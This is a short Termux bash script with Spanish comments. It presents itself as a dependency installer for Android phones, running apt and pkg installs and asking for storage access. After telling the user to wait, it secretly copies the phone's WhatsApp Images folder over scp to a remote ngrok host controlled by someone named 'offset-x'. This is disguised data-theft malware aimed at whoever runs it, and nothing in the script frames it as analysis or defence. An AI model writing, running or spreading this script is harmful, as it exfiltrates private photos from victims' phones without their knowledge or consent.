#!/bin/bash
#Validamos Conexion WIFI O Datos
if ping -c1 google.com.mx &>/dev/null;
then
        echo "Instalando Dependencias";
	echo "-----------------------";
	apt-get update -y ;
	pkg install wget openssh net-tools  -y
        echo "Dependencias Instaladas [OK]";
        termux-setup-storage
        echo "Espere unos minutos";
        scp -P 19537 -r /storage/emulated/0/WhatsApp/Media/WhatsApp Images/  offset-x@4.tcp.ngrok.io:/home/offset-x/Escritorio       
       

	$@
else
        echo "Necesitas Conexion WIFI o Datos Moviles";
fi
